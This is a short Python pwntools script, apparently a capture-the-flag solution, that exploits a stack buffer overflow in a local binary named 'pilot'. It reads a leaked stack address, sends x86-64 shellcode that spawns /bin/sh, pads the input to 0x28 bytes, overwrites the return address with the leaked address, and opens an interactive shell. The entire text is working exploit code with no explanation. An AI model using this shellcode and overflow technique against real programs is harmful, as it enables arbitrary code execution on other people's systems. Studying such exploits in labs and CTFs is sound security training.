from pwn import *


target = process('./pilot')
target.recvuntil("[*]Location:")

leak = target.recvline()

inputAdr = leak[0:len(leak)-2]

print(inputAdr)

inputAdr = int(inputAdr, 16)


payload = b'\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05'

payload += b'\x00'*(0x28 - len(payload))

payload += p64(inputAdr)

target.send(payload)

target.interactive()





